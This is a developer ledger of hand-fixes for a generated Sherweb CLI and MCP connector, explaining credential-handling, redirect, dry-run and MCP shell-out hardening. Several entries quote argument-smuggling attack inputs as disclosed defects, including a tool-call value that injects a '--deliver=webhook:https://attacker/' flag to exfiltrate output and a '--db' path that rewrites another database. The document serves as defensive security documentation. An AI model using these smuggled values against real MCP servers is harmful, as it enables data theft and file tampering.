_comment: Connector-specific edits to GENERATED files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: Sherweb's APIM gateway requires Ocp-Apim-Subscription-Key on EVERY call including the OAuth token mint itself
handfixes.why: Sherweb fronts its API with Azure APIM; the gateway rejects the client-credentials token request itself without the subscription key header. The generator emits the mint WITHOUT the second apiKey scheme header, so live auth 401s. This inline hand-fix was LOST in a prior regen and re-caught only by fresh-context adversarial review. Hand-wired at the token-mint path (auth.go) and the per-request paths (client.go). Mock-mode shipcheck cannot catch this (it never authenticates).
handfixes.spec_encode_followup: Spec `x-auth-env-vars: [SHERWEB_CLIENT_ID, SHERWEB_CLIENT_SECRET]` + the subscriptionKey apiKey scheme should drive the press to send the key on the mint; until absorbed, hand-wired here.

handfixes.summary: loadResourceRows runs a raw uncapped SELECT instead of store.List (whose limit<=0 default caps at 200 rows) so fleet-wide joins are not silently truncated
handfixes.why: store.List(rt, 0) caps at 200 rows, NOT unlimited (the generated data_source.go comment '0 = no limit' is wrong; same unabsorbed press gap hit pax8). Insight loaders aggregate the whole fleet, so a 200-row truncation silently drops data and produces wrong margin/usage rollups. loadResourceRows deliberately bypasses store.List with a raw query ordered by updated_at.
handfixes.spec_encode_followup: Fix store.List's limit<=0 semantics in the press (no cap means no cap); until then hand-authored loaders must use the raw query.

handfixes.summary: SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)
handfixes.why: Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.
handfixes.spec_encode_followup: DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.

asserts.contains: markers now survive a save; only MarkCredentialsExplicit clears them.

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For sherweb the manifest gained: SHERWEB_BASE_URL, SHERWEB_TOKEN_URL. server.json gained: SHERWEB_BASE_URL, SHERWEB_TOKEN_URL. mcp-install.md's env blocks gained: SHERWEB_BASE_URL, SHERWEB_TOKEN_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing
handfixes.why: The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {"db": "/path/to/someone-elses.sqlite"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because "db=/tmp/evil" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.
handfixes.spec_encode_followup: Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.

handfixes.summary: SHERWEB_NO_CONFIG_WRITE makes every credential write a no-op (token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)
handfixes.why: Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(""), the resolver the CLI uses, so the MCP server honours both SHERWEB_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.
handfixes.spec_encode_followup: cli-printing-press should emit <PREFIX>_NO_CONFIG_WRITE (or an equivalent) as part of the standard config surface, with the same three boundaries: the erase path exempt, explicit save commands failing loudly rather than no-oping, and the MCP server resolving its config through config.Load("") instead of a hardcoded home-relative path. The hardcoded path in internal/mcp/tools.go is a generator defect in its own right - it makes --config and <PREFIX>_CONFIG inert for every MCP install on every connector.

asserts.contains: | `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.

handfixes.summary: mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.
handfixes.why: Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under "Works with your agent", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.

asserts.contains: # Remote agents (paused until this connector is reprinted)

### Does this work with ChatGPT?

Not with this build.

handfixes.summary: An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)
handfixes.why: The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.
handfixes.spec_encode_followup: Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.

handfixes.summary: A redirect that leaves the origin (another host:port, or https down to http) carries no credential: every credential header and every config-file header is stripped, and a hop that would replay a request body (307/308 of a non-GET) is refused
handfixes.why: tools/maintainer/class_harness.py auth-wire found sherweb sending the Ocp-Apim-Subscription-Key header (SHERWEB_SUBSCRIPTION_KEY) to a second server on a 307. The generated CheckRedirect deleted only the primary auth header on a cross-host hop; Go itself strips Authorization and Cookie only when the hostname changes (a port change keeps them), never strips a custom header, and replays the body on a 307 or 308, which for a token request is the client secret. Same-origin hops still re-derive auth (ninjaone precedent); a non-GET hop off the origin is refused rather than replayed (connectsecure precedent). The unit tests call the client's real CheckRedirect with every header Go copies onto the next hop and fail on the generated code. The origin compares like a URL: hostnames case-insensitively and an explicit default port as none (Codex review round 1: an upper-case base URL refused a healthy same-origin redirect). Hosts compare the way the network resolves them: an IP literal by address with its IPv6 zone exact, a DNS name ASCII case-insensitively, a non-ASCII name exactly (Codex review round 2: case-folding the zone let fe80::1%LAN0 pass for fe80::1%lan0).
handfixes.spec_encode_followup: Press-side: client.go.tmpl CheckRedirect should strip every credential header (the primary, composed siblings and config-file headers) on any hop that leaves the origin, compare host:port and scheme, and refuse to replay a body off the origin; a hand-written auth client should get the same CheckRedirect.

handfixes.summary: --dry-run never mints a token or changes stored credentials: neither the client's automatic client-credentials mint nor `auth login --dry-run` sends the client secret to the token URL, and `auth set-token --dry-run` and `auth logout --dry-run` neither save nor clear anything
handfixes.why: tools/maintainer/class_harness.py write-safety found every --dry-run of a write command putting one request on the wire: authHeader ran before the dry-run branch and, with no cached token, POSTed the client ID and secret to the token URL and cached the token, while the generated comment and the docs say a dry run sends nothing. `auth login` minted through its own path and ignored --dry-run, and `auth set-token` and `auth logout` saved and cleared credentials under --dry-run (found by Codex review round 1). Same fix shape as connectwise-rmm, sophos-central and watchguard (dry-run-never-mints). TestDryRunNeverMintsAToken, TestAuthLoginDryRunSendsNothing and TestAuthSetTokenAndLogoutHonorDryRun count requests to a stub token server (each with a live control that proves the probe reaches the mint) and fail on the generated code.
handfixes.spec_encode_followup: Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.

asserts.contains: (dry run - no request sent, nothing saved)
